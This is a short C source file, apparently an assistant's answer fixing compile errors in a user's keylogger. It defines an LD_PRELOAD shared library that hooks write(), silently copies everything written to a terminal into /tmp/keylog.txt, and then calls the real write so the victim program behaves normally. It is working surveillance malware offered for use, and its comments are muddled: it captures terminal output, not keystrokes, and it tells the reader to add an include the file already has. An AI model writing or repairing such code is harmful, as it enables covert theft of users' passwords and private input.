#include <stdio.h>    // Required for fopen, fwrite, fclose
#include <string.h>   // FIX 1: Required for strlen()
#include <unistd.h>   // Required for access (used in real keyloggers)
#include <dlfcn.h> // New required include for dlsym and RTLD_NEXT

// FIX 2: Define the log file path
#define LOG_FILE "/tmp/keylog.txt" 

// FIX 3: Removed 'extern "C" {' 

// This function intercepts the 'write' syscall (or a similar logging function)
ssize_t write(int fd, const void *buf, size_t count)
{
    // Function pointers for the original write function
    ssize_t (*original_write)(int fd, const void *buf, size_t count);
    
    // Get the address of the original write function from the standard library
    original_write = dlsym(RTLD_NEXT, "write");

    // Check if the output is a terminal (fd 1 is stdout, 2 is stderr)
    // and if the buffer is printable characters.
    if (isatty(fd))
    {
        // Open the log file for appending
        FILE *f = fopen(LOG_FILE, "a"); // Appending mode "a"

        if (f != NULL)
        {
            // Write the keystrokes to the file
            fwrite(buf, sizeof(char), count, f);
            
            // OPTIONAL: Add a newline for better readability in the log file
            // fwrite("\n", 1, 1, f); 
            
            fclose(f);
        }
    }

    // Call the original write function so the program works normally
    return original_write(fd, buf, count);
}

// NOTE: You will also need to include dlfcn.h for dlsym/RTLD_NEXT in a real LD_PRELOAD keylogger.
// However, since your compiler error was about strlen/LOG_FILE/extern "C", this minimal fix should resolve the compilation errors.
